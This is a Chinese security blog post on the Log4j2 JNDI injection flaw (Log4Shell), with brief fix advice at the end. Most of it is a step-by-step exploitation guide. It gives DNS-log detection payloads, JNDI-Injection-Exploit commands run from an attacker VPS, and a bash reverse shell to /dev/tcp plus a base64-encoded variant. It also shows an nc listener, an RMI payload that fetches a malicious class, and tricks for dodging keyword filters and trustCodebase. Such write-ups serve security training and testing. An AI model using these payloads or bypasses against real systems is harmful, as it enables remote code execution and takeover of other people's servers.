#  log4j2漏洞   
simple学安全  simple学安全   2024-11-26 07:52  
  
目录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUicOJWSYZ8cXGJJP9WAA1dicoO1iaic8jPhnw05MoVtfZlzcuY2ybRwdI4jrK9cibfJYyhPslWlLqmkPuw/640?wx_fmt=png&from=appmsg "")  
  
漏洞简介  
  
Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性，该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。  
  
这个漏洞的触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行。利用该漏洞涉及到JNDI(Java命名和目录接口)，允许从指定的远程服务器获取并加载对象，通常利用LDAP和RMI服务。  
  
Log4j2的lookup查询服务提供了{}字段解析功能，传进去的值会被直接解析，如果未对lookup查询服务做限制，就可能让查询指向任何服务。该漏洞正是利用这一点在{}中构造JNDI注入，向攻击者的恶意地址获取恶意的.class对象，造成远程代码执行。  
  
漏洞发现与利用  
  
1、**漏洞发现**  
  
常用poc：  
```
${JNDI:LDAP://xxxx.dnslog.cn/test}
${jndi:rmi://xxxx.dnslog.cn/test}
```  
  
可在任意输入框、请求头字段如xff、ua中插入poc，观察dnslog网站是否有记录。  
  
推荐BurpSuite插件：log4j2burpscanner  
  
2、**漏洞利用**  
  
1）首先需要拥有一个VPS，在VPS上构造恶意的.class对象  
  
使用工具：JNDI-Injection-Exploit  
```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C [command] -A [address]

-C：指定需要执行的命令
-A：指定恶意.class对象所在服务器的ip，这里就是VPS的ip地址
```  
  
2）这里需要执行的命令为利用bash反弹shell  
```
bash -i >& /dev/tcp/vps_ip/port 0>&1
```  
  
由于使用工具  
JNDI-Injection-Exploit的-C指定命令时，特殊字符会有影响，因此对命令进行base64编码，可在如下网站快速得到编码后的语句：  
  
https://ares-x.com/tools/runtime-exec/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUicOJWSYZ8cXGJJP9WAA1dico3vf2dYqPKKxTVsUufZKsscXibB0yCLjtsAtx9iacNXS6jSZDD5bnnNfg/640?wx_fmt=png&from=appmsg "")  
```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3Rjcxxxxxxxxxx=}|{base64,-d}|{bash,-i}
```  
  
3）使用工具  
JNDI-Injection-Exploit构造恶意.class类，并开启端口，等待存在漏洞的服务器请求  
```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3Rjcxxxxxxxxxx=}|{base64,-d}|{bash,-i}" -A "vps_ip"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUicOJWSYZ8cXGJJP9WAA1dicowK1FN41Eo77KOsZ8wr0mKcepuOoVzRkJF4hNJGEGJdHhuvbriaiaVt7w/640?wx_fmt=png&from=appmsg "")  
  
4）在vps上开启nc监听  
```
nc -lvp 2333
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUicOJWSYZ8cXGJJP9WAA1dico4WYosK1Iq8ibSzic9fehMmic9bNsIyR2m2UcFWVur2UssHjPIWoD7NQXg/640?wx_fmt=png&from=appmsg "")  
  
5）访问存在漏洞的网站，利用payload进行利用，比如说这里使用：  
```
${jndi:rmi://xxx.xxx.xxx.240:1099/lv0edx}
```  
  
将这个payload放在存在漏洞的位置，即可反弹shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUicOJWSYZ8cXGJJP9WAA1dicoTKFCF7593iaw2pucN2YyXpbTYsKZXPVuxwBjddb020B7QCMksABsvIg/640?wx_fmt=png&from=appmsg "")  
  
这里的payload在url中，进行了url编码  
  
6）成功获得shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icjPTM4gYeUicOJWSYZ8cXGJJP9WAA1dicoh4KFFoODCWVkv5HfjtZ1DndpyN0cWfYKcEaZ4ZPDhS8CycSFqjBMhA/640?wx_fmt=png&from=appmsg "")  
  
绕过方法  
  
1、**多${}绕过**  
  
在处理  
${}时会递归查找，并且找到${}后还会查找 :- ，存在如下关系：  
  
${任意字符串:-想要的字符串}=想要的字符串，因此有如下绕过方法：  
  
${${xxxx:-j}ndi:ldap://xxxxx/xxx}=${jndi:ldap://  
xxxxx/x  
xx}  
  
2、**使用lower和upper绕过**  
  
可以使用lower和upper来绕过关键字检测，例如jndi被限制，可以使用如下方法绕过：  
  
$  
{  
${lower  
:J  
}  
ndi:l  
dap://  
xxxxx/x  
xx  
}  
  
3、**绕过trustcodebase**  
  
trustcodebase是RMI中的一个属性，用于决定是否信任远程代码库，当为false时，将不信任远程库，导致漏洞无法利用。  
  
可使用LDAP协议、直接利用本地类加载器、通过返回恶意类的路径而不是内容进行绕过。  
  
修复建议  
  
1、将Log4j升级到安全版本  
  
2、限制不必要的LDAP和RMI请求  
  
3、修改配置，从类路径中移除JndiLookup类  
  
